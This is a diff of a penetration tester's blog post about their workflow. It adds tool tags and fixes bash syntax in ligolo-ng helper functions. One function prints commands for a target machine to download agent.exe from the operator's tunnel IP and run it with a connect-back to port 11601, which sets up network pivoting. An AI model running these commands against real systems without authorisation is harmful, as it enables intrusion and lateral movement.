@@ -3,9 +3,13 @@ title: How I Operate
 date: 2026-03-03
 draft: false
 tags:
+  - nmap
+  - exegol
+  - claude code
+  - ligolo-ng
+  - tmux
   - workflow
   - tooling
-  - operator
 ---
 
 **Your terminal history is a biography.**
@@ -134,7 +138,7 @@ _ligolo-serve() {
     echo "[*] Ligolo File Server (${mode})"
     echo "[*] Serving agent binaries on ${tun0_ip}:80"
     echo ""
-    if  "$1" == "win" ; then
+    if [[ "$1" == "win" ]]; then
         echo "[+] Target download commands:"
         echo "    wget http://${tun0_ip}/agent.exe -usebasicparsing -O agent.exe"
         echo "    .\\agent.exe -connect ${tun0_ip}:11601 -ignore-cert"
@@ -160,7 +164,7 @@ _ligolo-proxy() {
 }
 
 start-ligolo() {
-    if | [[ "$1" != "win" && "$1" != "lin" ; then
+    if [[ -z "$1" ]] || [[ "$1" != "win" && "$1" != "lin" ]]; then
         echo "Usage: start-ligolo [win|lin]"
         return 1
     fi
